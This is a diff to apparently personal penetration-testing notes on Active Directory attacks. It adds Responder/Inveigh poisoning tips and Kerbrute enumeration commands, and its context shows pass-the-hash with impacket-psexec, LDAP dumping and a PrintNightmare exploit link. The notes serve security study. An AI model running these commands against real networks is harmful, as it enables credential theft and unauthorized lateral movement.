@@ -7,6 +7,9 @@ spiderman 10.0.2.221
 3. Check websites and look for alternate paths
 4. Look for default creds / low hanging fruit
 5. What else can I do?
+
+
+*Side note, generally use `responder` if you have a Linux host and `Inveigh` if you have a Windows host*
 ## LLMNR POISON
 *This attack works because a machine in an AD environment requests access to a named service that doesn't exist. The connection fails, and the attacker requests the user:hash to connect the target to the nonexistent service. The target sends the user:hash and attacker can use them for a hashcrack.
 
@@ -107,6 +110,10 @@ Run psexec manually with a hash
 ```
 impacket-psexec <user>@<DC-IP> -hashes <LM>:<NT>
 ```
+## Inveigh
+*Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.*
+https://github.com/Kevin-Robertson/Inveigh.git
+
 ## IPv6 DNS Takeover
 *This attack uses the unused IPv6 system to impersonate an IPv6 DNS and runs MiTM with the DC*
 
@@ -168,6 +175,23 @@ The stored LDAP credentials are usually located on the network settings tab in t
 *As previously seen in MiTM6*
 ```
 sudo ldapdomaindump ldaps://<LDAP_server> -u '<User>' -p <Password> -o <output_file>
+```
+## Kerbrute
+*Internal AD Username Enumerator*
+Install
+```
+sudo git clone https://github.com/ropnop/kerbrute.git
+sudo make all
+ls dist/
+```
+Running
+```
+./kerbrute_linux_amd64
+sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
+```
+or 
+```
+kerbrute userenum -d <Domain> --dc 172.16.5.5 jsmith.txt -o <output.txt>
 ```
 ## Bloodhound
 *Most common AD enumeration tool*
@@ -401,3 +425,7 @@ If you do run this, **make sure to change the password back, otherwise it will s
 [Exploit](https://github.com/calebstewart/CVE-2021-1675) Information
 
 ![AD_cheatsheet](../../AD_cheatsheet.jpg)
+
+
+
+![[../../Active_Directory_Enumeration_Attacks_Module_Cheat_Sheet.pdf]]
